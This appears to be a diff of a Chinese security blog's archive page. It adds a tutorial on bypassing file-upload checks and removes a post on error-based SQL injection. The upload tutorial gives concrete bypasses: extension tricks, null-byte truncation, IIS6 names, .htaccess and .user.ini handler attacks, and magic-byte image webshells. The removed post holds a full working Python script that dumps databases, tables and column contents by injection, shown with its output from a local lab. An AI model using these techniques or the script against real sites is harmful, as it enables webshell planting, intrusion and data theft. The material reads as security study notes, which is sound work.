@@ -144,6 +144,20 @@ alert("Please Update Your IE \n请升级您的IE浏览器");
       <div class="post-content animated fadeIn">
         <header>
             
+              <div class="icon depth"><a href="/2016/07/26/文件上传之绕过上传/"> </a></div>
+              <h2 class="depth title" ><a class="animated" href="/2016/07/26/文件上传之绕过上传/">文件上传之绕过上传</a></h2>
+            
+            <time class="time title depth" datetime="2016-07-26T11:29:50.000Z">2016-07-26</time>
+          </header>
+      </div>
+    </article>
+  </div>
+
+  <div class="archive titlelist">
+    <article class="post">
+      <div class="post-content animated fadeIn">
+        <header>
+            
               <div class="icon depth"><a href="/2016/07/26/文件上传/"> </a></div>
               <h2 class="depth title" ><a class="animated" href="/2016/07/26/文件上传/">文件上传</a></h2>
             
@@ -265,20 +279,129 @@ alert("Please Update Your IE \n请升级您的IE浏览器");
     </article>
   </div>
 
-  <div class="archive titlelist">
-    <article class="post">
-      <div class="post-content animated fadeIn">
-        <header>
-            
-              <div class="icon depth"><a href="/2016/07/06/sql注入报错注入/"> </a></div>
-              <h2 class="depth title" ><a class="animated" href="/2016/07/06/sql注入报错注入/">sql注入报错注入</a></h2>
-            
-            <time class="time title depth" datetime="2016-07-06T13:22:27.000Z">2016-07-06</time>
-          </header>
-      </div>
-    </article>
-  </div>
 
+
+
+  <div class="animated fadeIn" idplus="文件上传之绕过上传" style="display: none;">
+    <div idplusp="文件上传之绕过上传">
+      <article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img s1c="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon depth"></div>
+        <time class="depth" datetime="2016-07-26T11:29:50.000Z"><a href="#">2016-07-26</a></time>
+      
+      
+  
+    <h1 class="depth title">文件上传之绕过上传</h1>
+  
+
+    </header>
+    <div class="entry depth">
+      
+        <p><strong>一般防止上传漏洞手法</strong><br>1、客户端检测：客户端使用JavaScript检测，在文件未上传时，就对文件进行验证<br>    //任何客户端的验证都是不安全的，客户端验证目的是防止用户输入错误、减少<br>    //服务器开销，而服务端验证才可以真正防御攻击者。  2、服务器端检测：服务端脚本一般会检测文件的MIME类型，检测文件扩展名是否合法</p>
+<p><strong>客户端检测客户端验证代码形如下</strong>：<br>’‘’<html lang="en"><head><br>    <meta charset="UTF-8"><br>    <title>图片上传</title><br>    <script type="text/javascript"><br>    function checkFile(){<br>        var flag = false;<br>        var str = document.getElementById(“file”).value;<br>        str = str.substring(str.lastIndexOf(‘.’) + 1);<br>        var arr = new Array(‘png’,’bmp’,’gif’,’jpg’);<br>        for (var i=0;i<arr.length;i++){
+            if(str==arr[i]){
+                flag = true;
+            }
+        }
+        if(!flag){
+            alert('文件不合法！');
+        }
+        return flag;
+    }
+    </script></head><body><br>    <form action="upload.php" method="post" onsubmit="checkFile()" enctype="multipart/form-data"><br>        <input type="file" name="file" id="file"><br><br>        <input type="submit" value="提交" name="submit"><br>    </form></body></html>‘’<br>接收文件的脚本upload.php代码如下：<br>’‘’&lt;?phpif(isset($_POST[“submit”])){<br>    $name = $_FILES[‘file’][‘name’];<br>    $name = md5(date(‘Y-m-d h:m:s’)).strrchr($name,”.”);<br>    $size = $_FILES[‘file’][‘size’];<br>    $tmp = $_FILES[‘file’][‘tem_name’];<br>    move_uploaded_file($tmp,$name);<br>    echo “文件上传成功！path：”.$name;<br>}<br>?&gt;‘’‘<br>绕过：1、可以用firebug将form表单中的onsubmit事件删除，这样就可以绕过验证。<br>2、使用Burp Suite：<br>    1）先将木马文件的扩展名改为一张正常图片的扩展名，如jpg<br>    2）上传时使用Burp Suite拦截数据包，将木马文件扩展名改为php就可绕过客户端验证。<br>    注意：这里修改文件名字后，请求头中的Content-Length的值也要改</p>
+<p>服务端检测服务端分为6项：</p>
+<ul>
+<li>黑名单与白名单验证</li>
+<li>MIME验证</li>
+<li>目录验证</li>
+<li>截断上传攻击</li>
+<li>文件攻击</li>
+<li>检测文件内容</li>
+</ul>
+<p>黑名单与白名单验证</p>
+<pre><code>* 黑名单过滤方式
+</code></pre><p>’‘’&lt;?php<br>$Blacklist = array(‘asp’,’php’,’jsp’,’php5’,’asa’,’aspx’);    //黑名单if (isset($_POST[“submit”])){<br>    $name = $FILES[‘file’][‘name’];    //接收文件名<br>    $extension = substr(strrchr($name, “.”) , 1);    //得到扩展名<br>    $boo = false;<br>    foreach ($Blaklist as $key =&gt; $value){<br>        if ($value==$extension) {    //迭代判断是否命中<br>            $boo = true;<br>            break;     //命中后直接退出循环<br>        }<br>    }<br>    if (!$boo) {    //若没有被命中，则进行上传操作<br>        $size = $_FILES[‘file’][‘size’];  //接收文件大小<br>        $tmp = $FILES[‘file’][‘temp_name’];   //临时路径<br>        move_uploaded_file($tmp, $name);   //移动临时文件到当前文件目录<br>    } else {<br>        echo “文件不合法!!”;<br>    }<br>}<br>?&gt;‘’‘<br>对于上面的过滤可以通过如下方法绕过：</p>
+<ul>
+<li>从黑名单中找到web开发者忽略的扩展名，如：cer</li>
+<li>没有对扩展名进行大小写转换，在window平台依然可以大小写绕过</li>
+<li>在window下，若文件名以”.”或者空格作为结尾，系统会自动去除”.”与空格，<br>所以可以上传以“asp.”和“asp_”为扩展名的文件</li>
+<li>0x00截断绕过</li>
+<li>解析漏洞</li>
+</ul>
+<pre><code>* 白名单过滤方式
+</code></pre><p>’‘’&lt;?php<br>$WhiteList = array(‘rar’,’jpg’,’png’,’bmp’,’gif’,’jpg’,’doc’);<br>if(isset($_POST[“submit”])){<br>    $name = $_FILES[‘file’][‘name’];<br>    $extension = substr(strrchr($name,”.”),1);<br>    $boo = false;<br>    foreach($WhiteList as $key =&gt; $value){<br>        if($value==$extension){<br>            $boo = true;<br>        }<br>    }<br>    if($boo){<br>        $size = $_FILES[‘file’][‘size’];<br>        $tmp = $_FILES[‘file’][‘tmp_name’];<br>        move_uploaded_file($tmp,$name);<br>        echo “文件上传成功！<br>path:”.$name;<br>    }else{<br>        echo “文件不合法！”;<br>    }<br>}<br>?&gt;‘’‘<br>绕过方法：</p>
+<ul>
+<li>0x00截断绕过</li>
+<li>此时若在iis6.0，则可以将木马名改为test.asp;1.jpg来上传，从而通过验证</li>
+<li>配合解析漏洞</li>
+</ul>
+<p>MIME验证对文件MIME类型做验证的PHP代码如下：<br>’‘’&lt;?phpif($_FILES[‘file’][‘type’]==” image/jpeg”){<br>    $imageTempName = $_FILES[‘file’][‘tmp_name’];<br>    $imageName = $_FILES[‘file’][‘name’];<br>    $last = substr($imageName,strrpos($imageName,”.”));<br>    if(!is_dir(“uploadFile”)){<br>        mkdir(“uploadFile”);<br>    }<br>    $imageName = md5($imageName).$last;<br>    move_upload_file($imageTempName,”./uploadFile/“.$imageName);<br>    echo(“文件上传成功！ path = /uploadFile/$imageName”);<br>}else{<br>    echo(“文件上传类型错误，请重新上传…”);<br>    exit();<br>}<br>?&gt;‘’‘<br>未修改MIME类型，上传失败：<br>修改MIME类型，上传成功：<br>目录验证文件上传时通常允许用户将文件放到指定的目录中，若目录存在则将文件写入目录，否则新建目录然后写入，若为iis6.0则可以利用这个漏洞，客户端上传代码如下：<br>’‘’<html><head><br>    <meta charset="UTF-8"><br>    <title>up</title></head><body><br>    <form action="upload.php" method="post" enctype="multipart/form-data"><br>        <input type="file" name="file"><br><br>        <input type="hidden" name="Extension" value="up"><br>        <input type="submit" value="提交" name="submit"><br>    </form></body></html>‘’‘<br>服务端PHP接收文件的代码如下：<br>’‘’&lt;?phpif($_FILES[‘file’][‘type’]==”image/jpeg”){<br>    $imageTempName=$_FILES[‘file’][‘tmp_name’];<br>    $imageName=$_FILES[‘file’][‘name’];<br>    $last=substr($imageName,strrpos($imageName,”.”));<br>    if($last!=”.jpg”){<br>        echo(“mime error!<br>“);<br>    }<br>    $Extension=$_POST[‘Extension’];<br>    if(!is_dir($Extension)){<br>        mkdir(“./$Extension”);<br>        echo “mkidr $Extension succesfully”.”<br>“;<br>    }<br>    $imageName=md5($imageName).$last;<br>    move_uploaded_file($imageTempName,”./$Extension/“.$imageName);<br>    echo(“upload ok! path = /$Extension/$imageName”);<br>} else {<br>    echo(“type error…”);<br>    exit();<br>}<br>?&gt;‘’‘<br>查看上传到了那个文件：<br>将文件改名：<br>截断上传攻击截断上传攻击在ASP程序中比较常见(在PHP、JSP中也有) 先上传正常后缀的图片马：<br>更改图片名字：</p>
+<p>截断：</p>
+<p>上传成功：<br>文件攻击</p>
+<pre><code>* .htaccess文件攻击
+</code></pre><p>通过.htaccess文件调用php解析器去解析一个文件名中只要包含”haha”这个字符串的任意文件，无论扩展名是什么(没有也行)，都以php的方式来解析，.haccess文件代码如下：</p>
+<filesmatch "haha"="">SetHandler application/x-httpd-php<br></filesmatch><br>或者如下，上传一个文件名为evil.gif的图片马：<br><filesmatch "evil.gif"=""><br><br>SetHandler application/x-httpd-php<br></filesmatch>
+
+<pre><code>* .user.ini文件攻击
+</code></pre><p>只要中间键是以fastcgi运行的php都可以用这个方法，.user.ini能被动态加载，它也有两个配置<br>项：auto_append_file和auto_prepend_file，只要在.user.ini中添加auto_prepend_file=aa.jpg<br>这句话，就可以让其他php文件执行前自动包含aa.jpg，和require()类似。</p>
+<p>检测文件内容</p>
+<pre><code>* 文件幻数检测
+</code></pre><p>在文件首部加上如下幻数，后面跟一句话木马即可</p>
+<p>JFIF    FF D8 FF E0 00 10 4A 46 49 46<br>GIF89a  47 49 46 38 39 61<br>PNG     89 50 4E 47</p>
+<pre><code>* 文件相关信息检测
+</code></pre><p>通常用的getimagesize()函数，只需要在幻数基础上加一些文件信息就行了，如下：</p>
+<p>GIF89a<br>(…some binary data for image…)<br>&lt;?php phpinfo(); ?&gt;<br>(… skipping the rest of binary data …)</p>
+<pre><code>* 文件加载检测
+</code></pre><p>服务端会调用API或函数对文件进行加载测试，常见的是图像渲染测试，变态的甚至是二次渲染：</p>
+<p>对渲染/加载测试的攻击方式是代码注入绕过<br>对二次渲染的攻击方式是攻击文件加载器本身</p>
+<p>文件上传之文本编辑器漏洞<br>常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。<br>下面以FCKeditor(现名为CKEditor)为例：<br>1、敏感信息暴漏</p>
+<pre><code>* 查看版本信息
+    /FCKeditor/editor/dialog/fck_about.html
+* 默认上传页面
+    /FCKeditor/editor/filemanager/browser/default/browser.html
+    /FCKeditor/editor/filemanager/browser/default/connectors/test.html
+    /FCKeditor/editor/filemanager/upload/test.html
+    /FCKeditor/editor/filemanager/connectors/test.html
+    /FCKeditor/editor/filemanager/connectors/uploadtest.html
+* 其他敏感文件
+    /FCKeditor/editor/filemanager/connectors/aspx/connector.html
+    /FCKeditor/editor/filemanager/connectors/asp/connector.html
+    /FCKeditor/editor/filemanager/connectors/php/connector.php
+</code></pre><p>2、黑名单策略错误<br>    FCKeditor&lt;=2.4.3版本采用的是有弊端的黑名单策略，可以采用asa、cer等扩展名<br>3、任意文件上传漏洞<br>    FCKeditor的2.4.2及以下本本的黑名单配置信息里没有定义类型Media，直接构造html表单就行，<br>在form中的action=”<a href="http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=M" target="_blank" rel="external">http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=M</a></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+      
+    </div>
+  </div>
 
 
 
@@ -1088,103 +1211,6 @@ for h in colm:
 
 
 
-  <div class="animated fadeIn" idplus="sql注入报错注入" style="display: none;">
-    <div idplusp="sql注入报错注入">
-      <article class="post">
-  
-    <div class="gallery">
-  <div class="photoset">
-    
-      <img s1c="">
-    
-  </div>
-  <div class="control">
-    <div class="prev"></div>
-    <div class="next"></div>
-  </div>
-</div>
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon depth"></div>
-        <time class="depth" datetime="2016-07-06T13:22:27.000Z"><a href="#">2016-07-06</a></time>
-      
-      
-  
-    <h1 class="depth title">sql注入报错注入</h1>
-  
-
-    </header>
-    <div class="entry depth">
-      
-        <p>利用方式<br>count()、rand()、group by三者缺一不可<br>报错注入用一个公式，只要套用公式即可，公式如下:<br>?id=2’ and (select 1 from (select count(),concat( floor(rand(0)<em>2),(select (select (爆错语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a )–+<br>公式解析<br>Floor()是取整数<br>Rand()在0和1之间产生一个随机数<br>Rand(rand()</em>2)将取到0和2的随机数<br>Floor(rand(0)<em>2)记录需为3条以上，且3条以上必报错，返回的值是有规律的<br>Count(</em>)用来统计结果的，相当于刷新一次结果<br>Group by 在对数据进行分组时会先看看虚拟表里有没有这个值，没有的话就插入存在<br>的话count(<em>)加1，在使用group by时floor(rand(0)</em>2)会被执行一次，不存在记录，洗标会再执行一次<br>1.猜测闭合字符<br><img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/1.png?raw=true" alt="image"><br>多了一个单引号所有闭合字符为单引号</p>
-<p><img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/2.png?raw=true" alt="image"><br>猜测列数<br><img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/3.png?raw=true" alt="image"><br>尝试得到显示位<br><img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/4.png?raw=true" alt="image"><br>报错得到数据库个数<br><img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/5.png?raw=true" alt="image"><br><img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/6.png?raw=true" alt="image"><br>报错得到数据库的表名<br><img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/7.png?raw=true" alt="image"><br>报错得到数据库的列的数量<br><img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/8.png?raw=true" alt="image"><br>报错得到数据库的列名<br><img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/9.png?raw=true" alt="image"><br>得到列的值<br><img s1c="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/10.png?raw=true" alt="image"></p>
-<p>附上报错注入的代码</p>
-<p>#coding=utf-8</p>
-<p>#<a href="http://127.0.0.1/sqli-labs-master/Less-5/?id=1" target="_blank" rel="external">http://127.0.0.1/sqli-labs-master/Less-5/?id=1</a></p>
-<p>import sys<br>import binascii<br>import requests<br>import re</p>
-<p>def http_get(url):<br>    return (requests.get(url))</p>
-<p>def getAllDatabases(url):<br>    dbs_url = url + “‘+and(select 1 from(select count(<em>),concat((select (select (select concat(0x7e7e3a7e7e, count(distinct+table_schema),0x7e7e3a7e7e) from information_schema.tables)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+”</p>
-<pre><code>#print (dbs_url)
-respon = http_get(dbs_url)
-data_html = respon.content
-#print (html)
-dbs_num = int(re.search(r&apos;~~:~~(\d*?)~~:~~&apos;,data_html).group(1))
-print (&quot;databases:%s&quot;% dbs_num)
-print &quot;-------------&quot;
-dbs = []
-for index in xrange(0,dbs_num):
-    db_name_url = url + &quot;&apos;+and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e7e3a7e7e, table_schema, 0x7e7e3a7e7e) from information_schema.tables limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % index
-    #print db_name_url
-    respon = http_get(db_name_url)
-    database_html = respon.content
-    db_name = re.search(r&apos;~~:~~(.*?)~~:~~&apos;,database_html).group(1)
-    dbs.append(db_name)
-    print &quot;|  %s  |&quot; % db_name
-print &quot;-------------&quot;
-</code></pre><p>def getAlltables(url,db_name):</p>
-<pre><code># print (url)
-# print (db_name)
-db_name_hex = &quot;0x&quot; + binascii.b2a_hex(db_name)
-tables_num_url = url + &quot;&apos;+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e, count(table_name), 0x7e7e3a7e7e)  from information_schema.tables where table_schema=%s)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % db_name_hex
-html = http_get(tables_num_url).content
-tables_num = int(re.search(r&apos;~~:~~(\d*?)~~:~~&apos;, html).group(1))
-print &quot;Databases:%s  Table: %d&quot; % (db_name, tables_num)
-print &quot;Table:&quot;
-print &quot;-------------&quot;
-for index in xrange(0,tables_num):
-    tables_name_url = url + &quot;&apos;+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e, table_name, 0x7e7e3a7e7e) from information_schema.tables where table_schema=%s limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % (db_name_hex, index)
-    html = http_get(tables_name_url).content
-    table_name = re.search(r&apos;~~:~~(.*?)~~:~~&apos;, html).group(1)
-    print &quot;|  %s  |&quot; % table_name
-print &quot;-------------&quot;
-</code></pre><p>def getAllcolumns(url,database,table):<br>    db_name_hex = “0x” + binascii.b2a_hex(database)<br>    table_name_hex = “0x” + binascii.b2a_hex(table)<br>    columns_url = url + “‘+and(select 1 from(select count(<em>),concat((select (select ( select concat(0x7e7e3a7e7e,count(column_name),0x7e7e3a7e7e) from information_schema.columns where table_name=%s and table_schema=%s)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+”%(table_name_hex,db_name_hex)<br>    html = http_get(columns_url).content<br>    columns_num = int(re.search(r’<del>:</del>(\d<em>?)<del>:</del>‘, html).group(1))<br>    print “Databases:%s  Table: %s  Columns:%d” % (database,table,columns_num)<br>    print “Columns:”<br>    print “————-“<br>    for index in xrange(0,columns_num):<br>        columns_url = url + “‘+and(select 1 from(select count(</em>),concat((select (select ( select concat(0x7e7e3a7e7e, column_name, 0x7e7e3a7e7e) from information_schema.columns where table_name=%s and table_schema=%s limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)<em>2))x from information_schema.tables group by x)a) –+” % (table_name_hex,db_name_hex,index)<br>        html = http_get(columns_url).content<br>        columns_name = re.search(r’<del>:</del>(.</em>?)<del>:</del>‘, html).group(1)<br>        print “|  %s  |” % columns_name<br>    print “————-“</p>
-<p>def getAllcontents(url,database,table,column):<br>    column_content_url = url + “‘+and(select 1 from(select count(<em>),concat((select (select ( select concat(0x7e7e3a7e7e, count(</em>), 0x7e7e3a7e7e) from %s.%s)) from information_schema.tables limit 0,1),floor(rand(0)<em>2))x from information_schema.tables group by x)a) –+”%(database,table)<br>    html = http_get(column_content_url).content<br>    columns_num = int(re.search(r’<del>:</del>(\d</em>?)<del>:</del>‘, html).group(1))<br>    print “Databases:%s  Table: %s  Columns:%d” % (database,table,columns_num)<br>    print “Columns:”<br>    print “————-“<br>    for index in xrange(0,columns_num):<br>        column_content_url = url + “‘+and(select 1 from(select count(<em>),concat((select (select ( select concat(0x7e7e3a7e7e,%s,0x7e7e3a7e7e) from %s.%s limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+” % (column,database,table,index)<br>        html = http_get(column_content_url).content<br>        column_content_name = re.search(r’<del>:</del>(.*?)<del>:</del>‘, html).group(1)<br>        print “|  %s  |” % column_content_name<br>    print “————-“</p>
-<p>def main():<br>    if sys.argv[1] == ‘–dbs’:<br>        getAllDatabases(sys.argv[2])<br>    elif sys.argv[1] == ‘–tab’:<br>        getAlltables(sys.argv[2],sys.argv[3])<br>    elif sys.argv[1] == ‘–col’:<br>        getAllcolumns(sys.argv[2],sys.argv[3],sys.argv[4])<br>    elif sys.argv[1] == ‘–dump’:<br>        getAllcontents(sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5])<br>    else:<br>        print (‘What…’)</p>
-<p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    main()</p>
-<h1 id="C-Python27-gt-python-E-POC-python-shell-sql-py-–dbs-http-127-0-0-1-sqli-labs-m"><a href="#C-Python27-gt-python-E-POC-python-shell-sql-py-–dbs-http-127-0-0-1-sqli-labs-m" class="headerlink" title="C:\Python27&gt;python E:\POC\python\shell\sql.py –dbs http://127.0.0.1/sqli-labs-m"></a>C:\Python27&gt;python E:\POC\python\shell\sql.py –dbs <a href="http://127.0.0.1/sqli-labs-m" target="_blank" rel="external">http://127.0.0.1/sqli-labs-m</a></h1><h1 id="aster-Less-5-id-1"><a href="#aster-Less-5-id-1" class="headerlink" title="aster/Less-5/?id=1"></a>aster/Less-5/?id=1</h1><h1 id="databases-23"><a href="#databases-23" class="headerlink" title="databases:23"></a>databases:23</h1><h1 id="————"><a href="#————" class="headerlink" title="————-"></a>————-</h1><h1 id="information-schema"><a href="#information-schema" class="headerlink" title="|  information_schema  |"></a>|  information_schema  |</h1><h1 id="bbs"><a href="#bbs" class="headerlink" title="|  bbs  |"></a>|  bbs  |</h1><h1 id="book"><a href="#book" class="headerlink" title="|  book  |"></a>|  book  |</h1><h1 id="challenges"><a href="#challenges" class="headerlink" title="|  challenges  |"></a>|  challenges  |</h1><h1 id="dvwa"><a href="#dvwa" class="headerlink" title="|  dvwa  |"></a>|  dvwa  |</h1><h1 id="dvwaa"><a href="#dvwaa" class="headerlink" title="|  dvwaa  |"></a>|  dvwaa  |</h1><h1 id="guestbook"><a href="#guestbook" class="headerlink" title="|  guestbook  |"></a>|  guestbook  |</h1><h1 id="hack"><a href="#hack" class="headerlink" title="|  hack  |"></a>|  hack  |</h1><h1 id="kppw26"><a href="#kppw26" class="headerlink" title="|  kppw26  |"></a>|  kppw26  |</h1><h1 id="lol"><a href="#lol" class="headerlink" title="|  lol  |"></a>|  lol  |</h1><h1 id="mysql"><a href="#mysql" class="headerlink" title="|  mysql  |"></a>|  mysql  |</h1><h1 id="paimai"><a href="#paimai" class="headerlink" title="|  paimai  |"></a>|  paimai  |</h1><h1 id="C-Python27-gt-python-E-POC-python-shell-sql-py-–tab-http-127-0-0-1-sqli-labs-m"><a href="#C-Python27-gt-python-E-POC-python-shell-sql-py-–tab-http-127-0-0-1-sqli-labs-m" class="headerlink" title="C:\Python27&gt;python E:\POC\python\shell\sql.py –tab http://127.0.0.1/sqli-labs-m"></a>C:\Python27&gt;python E:\POC\python\shell\sql.py –tab <a href="http://127.0.0.1/sqli-labs-m" target="_blank" rel="external">http://127.0.0.1/sqli-labs-m</a></h1><h1 id="aster-Less-5-id-1-book"><a href="#aster-Less-5-id-1-book" class="headerlink" title="aster/Less-5/?id=1 book"></a>aster/Less-5/?id=1 book</h1><h1 id="Databases-book-Table-2"><a href="#Databases-book-Table-2" class="headerlink" title="Databases:book  Table: 2"></a>Databases:book  Table: 2</h1><h1 id="Table"><a href="#Table" class="headerlink" title="Table:"></a>Table:</h1><h1 id="————-1"><a href="#————-1" class="headerlink" title="————-"></a>————-</h1><h1 id="content"><a href="#content" class="headerlink" title="|  content  |"></a>|  content  |</h1><h1 id="user"><a href="#user" class="headerlink" title="|  user  |"></a>|  user  |</h1><h1 id="————-2"><a href="#————-2" class="headerlink" title="————-"></a>————-</h1><h1 id="C-Python27-gt-python-E-POC-python-shell-sql-py-–col-http-127-0-0-1-sqli-labs-m"><a href="#C-Python27-gt-python-E-POC-python-shell-sql-py-–col-http-127-0-0-1-sqli-labs-m" class="headerlink" title="C:\Python27&gt;python E:\POC\python\shell\sql.py –col http://127.0.0.1/sqli-labs-m"></a>C:\Python27&gt;python E:\POC\python\shell\sql.py –col <a href="http://127.0.0.1/sqli-labs-m" target="_blank" rel="external">http://127.0.0.1/sqli-labs-m</a></h1><h1 id="aster-Less-5-id-1-book-user"><a href="#aster-Less-5-id-1-book-user" class="headerlink" title="aster/Less-5/?id=1 book user"></a>aster/Less-5/?id=1 book user</h1><h1 id="Databases-book-Table-user-Columns-3"><a href="#Databases-book-Table-user-Columns-3" class="headerlink" title="Databases:book  Table: user  Columns:3"></a>Databases:book  Table: user  Columns:3</h1><h1 id="Columns"><a href="#Columns" class="headerlink" title="Columns:"></a>Columns:</h1><h1 id="————-3"><a href="#————-3" class="headerlink" title="————-"></a>————-</h1><h1 id="id"><a href="#id" class="headerlink" title="|  id  |"></a>|  id  |</h1><h1 id="username"><a href="#username" class="headerlink" title="|  username  |"></a>|  username  |</h1><h1 id="password"><a href="#password" class="headerlink" title="|  password  |"></a>|  password  |</h1><h1 id="————-4"><a href="#————-4" class="headerlink" title="————-"></a>————-</h1><h1 id="C-Python27-gt-python-E-POC-python-shell-sql-py-–dump-http-127-0-0-1-sqli-labs"><a href="#C-Python27-gt-python-E-POC-python-shell-sql-py-–dump-http-127-0-0-1-sqli-labs" class="headerlink" title="C:\Python27&gt;python E:\POC\python\shell\sql.py –dump http://127.0.0.1/sqli-labs-"></a>C:\Python27&gt;python E:\POC\python\shell\sql.py –dump <a href="http://127.0.0.1/sqli-labs-" target="_blank" rel="external">http://127.0.0.1/sqli-labs-</a></h1><h1 id="master-Less-5-id-1-book-user-username"><a href="#master-Less-5-id-1-book-user-username" class="headerlink" title="master/Less-5/?id=1 book user username"></a>master/Less-5/?id=1 book user username</h1><h1 id="Databases-book-Table-user-Columns-7"><a href="#Databases-book-Table-user-Columns-7" class="headerlink" title="Databases:book  Table: user  Columns:7"></a>Databases:book  Table: user  Columns:7</h1><h1 id="Columns-1"><a href="#Columns-1" class="headerlink" title="Columns:"></a>Columns:</h1><h1 id="————-5"><a href="#————-5" class="headerlink" title="————-"></a>————-</h1><h1 id="ttttt"><a href="#ttttt" class="headerlink" title="|  ttttt  |"></a>|  ttttt  |</h1><h1 id="ccccc"><a href="#ccccc" class="headerlink" title="|  ccccc  |"></a>|  ccccc  |</h1><h1 id="ddddd"><a href="#ddddd" class="headerlink" title="|  ddddd  |"></a>|  ddddd  |</h1><h1 id="xiaohong"><a href="#xiaohong" class="headerlink" title="|  xiaohong  |"></a>|  xiaohong  |</h1><h1 id="xiao"><a href="#xiao" class="headerlink" title="|  xiao  |"></a>|  xiao  |</h1><h1 id="xiaohong-1"><a href="#xiaohong-1" class="headerlink" title="|  xiaohong  |"></a>|  xiaohong  |</h1><h1 id="xiaoxiao"><a href="#xiaoxiao" class="headerlink" title="|  xiaoxiao  |"></a>|  xiaoxiao  |</h1><h1 id="————-6"><a href="#————-6" class="headerlink" title="————-"></a>————-</h1>
-      
-    </div>
-    <footer>
-      
-        
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-      
-    </div>
-  </div>
-
-
-
 
 
 
@@ -1266,7 +1292,7 @@ print &quot;-------------&quot;
 <nav id="pagination" class="titlelist">
   
   
-    <a href="/page/2/" class="alignright next titlelist">Next</a>
+    <a href="/page/2/" class="alignright next titlelist">Вперед</a>
   
   <div class="clearfix"></div>
 </nav>
